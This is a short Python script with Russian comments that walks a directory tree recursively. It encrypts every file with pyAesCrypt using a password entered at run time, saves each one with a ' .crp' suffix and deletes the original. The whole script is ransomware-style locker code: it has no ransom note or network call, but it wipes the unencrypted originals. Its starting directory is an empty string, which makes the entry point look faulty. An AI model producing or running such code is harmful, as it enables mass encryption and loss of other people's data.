import pyAesCrypt
import os


# Функция шифрования файла
def encryption(file, password):

    # Задаём размера буфера
    buffer_size = 523 * 1024

    # вызыываем метод шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + " .crp",
        password,
        buffer_size
    )

    # чтобы выдеть результат выводим на печать файл имя зашифрованного файла
    print(" [Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # удаляем исходный файл
    os.remove(file)


# Функция сканирования директорий
def walking_by_dirs(dir, password):

    # перебираем все поддиректории в узаканной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # если находим файл то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # если находим директорию, то повторяем цикл в поисках файлов
        else:
            walking_by_dirs(path, password)


password = input('Введите пароль для шифрования: ')
walking_by_dirs('', password )
